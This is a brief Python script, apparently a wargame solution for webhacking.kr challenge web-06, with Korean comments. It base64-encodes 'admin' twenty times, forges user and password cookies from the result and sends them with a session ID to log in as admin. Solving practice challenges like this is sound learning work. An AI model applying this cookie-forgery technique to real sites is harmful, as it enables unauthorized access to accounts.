#http://webhacking.kr/challenge/web/web-06/
'''
---설명---
index.phps 를 보면 base64를 20번 돌림
쿠키 id, password 값을 base64 20번 돌린 값으로 변경
'''

import base64
import urllib.request
import re

phpsessid='805defb40aabf56fc3bdc3336a183499'
id_pw=b'admin'

print("encode start")
for i in range(0,20):
    id_pw=base64.b64encode(id_pw)

id_pw=id_pw.decode('utf-8')
print(id_pw)
# 1.URL오픈
req=urllib.request.Request("http://webhacking.kr/challenge/web/web-06/")
# 2.URL헤더를 수정
req.add_header('Cookie',"user=%s; password=%s; PHPSESSID=%s" %(id_pw,id_pw,phpsessid))
# 3.수정한 헤더를 넣고 다시 페이지 오픈 하면 성공!!
html=urllib.request.urlopen(req).read().decode()
print(html)